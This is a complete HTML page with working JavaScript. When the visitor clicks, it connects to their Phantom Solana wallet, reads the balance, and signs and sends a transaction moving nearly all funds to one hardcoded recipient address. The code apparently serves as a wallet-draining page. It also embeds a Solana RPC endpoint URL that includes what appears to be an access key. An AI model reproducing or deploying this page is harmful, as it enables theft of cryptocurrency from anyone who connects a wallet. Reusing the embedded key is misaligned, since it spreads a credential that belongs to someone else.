<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Transfer</title>

    <!-- Buffer Polyfill MUST COME FIRST -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/5.7.1/buffer.min.js"></script>
    
    <!-- Then load Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>

    <link rel="icon" href="data:,">
</head>
<body>
    <h1>Click below to transfer all funds</h1>
    <button id="transferButton">Transfer Now</button>

    <script>
        document.getElementById('transferButton').addEventListener('click', async () => {
            if (!window.solana) {
                alert('Phantom wallet not found. Please install Phantom.');
                return;
            }

            try {
                // Connect to Phantom Wallet
                await window.solana.connect();
                const publicKey = window.solana.publicKey;
                if (!publicKey) {
                    throw new Error('Failed to get public key.');
                }

                // Connect to Solana RPC
                const connection = new solanaWeb3.Connection(
                    'https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df',
                    'confirmed'
                );

                // Get Balance
                const balance = await connection.getBalance(publicKey);
                if (balance <= 5000) {
                    alert('Insufficient SOL balance to cover transaction fees.');
                    return;
                }

                // Define Recipient Wallet
                const recipient = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');

                // Create Transaction
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: recipient,
                        lamports: balance - 5000 // Deduct estimated transaction fee
                    })
                );

                transaction.feePayer = publicKey;
                const { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;

                // Sign & Send Transaction
                const signedTransaction = await window.solana.signTransaction(transaction);
                const signature = await connection.sendRawTransaction(signedTransaction.serialize());

                await connection.confirmTransaction(signature);

                alert(`Transaction successful! Signature: ${signature}`);
            } catch (error) {
                alert(`Transaction failed: ${error.message}`);
            }
        });
    </script>
</body>
</html>
